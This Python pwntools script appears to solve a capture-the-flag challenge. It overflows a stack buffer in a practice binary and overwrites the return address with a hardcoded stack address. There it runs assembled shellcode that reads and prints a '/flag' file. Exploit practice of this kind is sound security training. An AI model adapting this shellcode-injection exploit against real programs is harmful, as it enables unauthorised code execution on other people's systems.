from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './challenge/binary-exploitation-hijack-to-shellcode'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = find_offset(exe, cyclic(500))

input_buffer_addr = 0x7fffffffc650
shellcode = """
    mov al, 2
    mov rbx, 0x67616c662f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    syscall

    xor rdi, rdi
    mov dil, al
    mov rsi, rsp
    mov dl, 100
    xor rax, rax
    syscall

    xor rax, rax
    mov al, 1
    mov dil, 1
    syscall

    mov rax, 60 
    xor rdi, rdi
    syscall
"""
shellcode = asm(shellcode)
print(len(shellcode))
shellcode += b"A"*(72-len(shellcode))
io = start()

payload = flat([
    shellcode,
    input_buffer_addr
])
open("payload", "wb").write(payload)
io.sendlineafter(b'', payload)
print(io.recvall())

# io.interactive()
